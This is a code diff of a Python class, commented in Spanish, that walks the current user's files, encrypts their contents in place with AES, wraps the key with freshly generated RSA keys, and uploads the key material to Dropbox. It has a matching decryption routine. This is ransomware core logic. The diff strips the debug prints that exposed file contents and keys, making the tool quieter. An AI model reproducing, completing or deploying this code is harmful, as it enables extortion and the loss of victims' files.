@@ -50,11 +50,8 @@ class AEScipher:
 
     # Funtion to encrypt the data with AES key
     def encrypt(self):
-        
-        print("\n-----ENCRYPT FILE-----")
 
         aes_key = self.generate_aes_key()
-
         iv = get_random_bytes(16)
 
         with open(self.iv_path, "wb") as iv_file:
@@ -66,27 +63,12 @@ class AEScipher:
             cipher_data, rest_content = self.open_file(path)
 
             cipher_content = pad(cipher_data, self.block_size)
-            
-            print("\n")
-            print("Contenido del archivo a cifrar:\n" , cipher_data)
-            print("Resto del contenido del archivo:\n" , rest_content)
-            print("Conenido del archivo a cifrar tras aplicar padding:\n" , cipher_content)
-            print("Cantidad de carácteres tras aplicar padding:\n" , len(cipher_content))
-
             encrypted_data = cipher.encrypt(cipher_content)
-
-            print("Contenido del archivo encriptado:\n" , encrypted_data)
-
-            print("Cantidad de carácteres del archivo encriptado:\n" , len(encrypted_data))
 
             with open(self.size_bytes_path, "w") as content_size:
                 content_size.write(str(len(encrypted_data)))
 
             concat_bytes = encrypted_data + rest_content
-
-            print("\n")
-            print("Contenido del archivo a cifrar una vez encriptado:\n" , encrypted_data)
-            print("Resto del contenido del archivo:\n" , rest_content)
 
             try:
                 with open(path, "wb") as encrypted_file:
@@ -95,8 +77,6 @@ class AEScipher:
                 print ("Error")
             except OSError:
                 print ("Error")
-                
-            print("\nContenido del archivo al completo una vez cifrado:\n" , concat_bytes)
 
             concat_bytes = b'\x00'
             encrypted_data = b'\x00'
@@ -105,9 +85,6 @@ class AEScipher:
             rest_content = b'\x00'
 
         public_key, private_key = Asymmetric.generate_rsa_keys()
-
-        print("\n", public_key)
-        print("\n", private_key)
         cipher_aes_key = Asymmetric.encrypt_aes_key(aes_key, public_key)
 
         Dropbox_integration.upload_files(cipher_aes_key, public_key, private_key)
@@ -154,20 +131,8 @@ class AEScipher:
         for path in Walk_files.find_files(Walk_files.username()):
             
             cipher_data, rest_content = self.open_file_encrypted(path)
-
-            print("\n")
-            print("Contenido del archivo a cifrar una vez encriptado:\n" , cipher_data)
-            print("Resto del contenido del archivo:\n" , rest_content)
-
             file_bytes_decrypted = cipher.decrypt(cipher_data)
-
-            print("Contenido del archivo a cifrar una vez quitado el padding:\n" , file_bytes_decrypted)
-
             decrypted_data = unpad(file_bytes_decrypted, self.block_size)
-
-            print("Contenido del archivo tras quitar el padding:\n" , decrypted_data)
-            print("Cantidad de carácteres una vez quitado el padding:\n" , len(decrypted_data))
-
             concat_bytes_decrypted = decrypted_data + rest_content
 
             try:
@@ -177,8 +142,6 @@ class AEScipher:
                 print("Error")
             except OSError:
                 print ("Error")
-
-            print("\nContenido del archivo al completo una vez descifrado:\n" , concat_bytes_decrypted)
         
             file_bytes_decrypted = b'\x00'
             decrypted_data = b'\x00'
